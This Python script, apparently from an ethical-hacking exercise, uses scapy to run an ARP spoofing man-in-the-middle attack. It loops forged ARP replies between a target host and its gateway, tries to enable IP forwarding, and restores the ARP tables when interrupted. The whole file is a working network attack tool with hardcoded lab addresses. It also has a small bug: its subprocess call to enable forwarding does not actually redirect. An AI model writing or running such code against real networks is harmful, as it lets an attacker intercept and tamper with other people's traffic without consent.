#! /usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import subprocess

def get_arguments():
    parse = optparse.OptionParser()
    parse.add_option("-t", "--target", dest="target_ip", help="IP address of target machine")
    parse.add_option("-g", "--gateway", dest="gateway_ip", help="Ip address of gateway/router")
    (options, arguments) = parse.parse_args()
    if not options.target_ip:
        parse.error("[-] Please specify a target IP, use --help for more info.")
    elif not options.gateway_ip:
        parse.error("[-] Please specify a gateway IP, use --help for more info.")
    return options



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #op - determines whether its request or response, op=1 is request and op=2 is response
    scapy.send(packet, verbose=False)



def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac);
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = "10.0.2.11"
gateway_ip = "10.0.2.1"



#python 2.7 and lower
try:
    sent_packets_count = 0
    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    print("[+] Enabled port forwarding")
    while True:
        spoof(options.target_ip, options.gateway_ip)  # spoofing target
        spoof(options.gateway_ip, options.target_ip)  # spoofing router
        sent_packets_count += 2
        print("\r[+] Packets Sent: " + str(
            sent_packets_count)),  # , to print all in one line and \r overrites the print stmt
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected ctrl+C ... Resetting ARP table...")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
    print("\n[+] Restore complete")


#python 3
#while True:
    #spoof("10.0.2.11", "10.0.2.1") #spoofing target
    #spoof("10.0.2.1", "10.0.2.11") #spoofing router
    #sent_packets_count+=2
    #print("\r[+] Packets Sent: " + str(sent_packets_count), end="") #, to print all in one line and \r overrites the print stmt
    #time.sleep(2)
    
